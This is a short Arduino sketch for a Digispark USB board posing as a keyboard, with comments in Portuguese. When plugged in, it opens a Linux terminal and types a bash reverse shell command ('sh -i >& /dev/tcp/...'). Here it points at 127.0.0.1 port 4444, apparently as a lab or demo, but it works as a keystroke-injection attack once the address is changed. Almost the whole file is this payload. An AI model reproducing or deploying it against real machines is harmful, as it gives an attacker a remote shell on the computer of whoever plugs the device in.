#include <stdlib.h>
#include "DigiKeyboard.h"

void setup() {
  //linux - abre terminal
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);    
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(1000);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  // linux - reverse shell
  DigiKeyboard.print("sh -i >& /dev/tcp/127.0.0.1/4444 0>&1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}


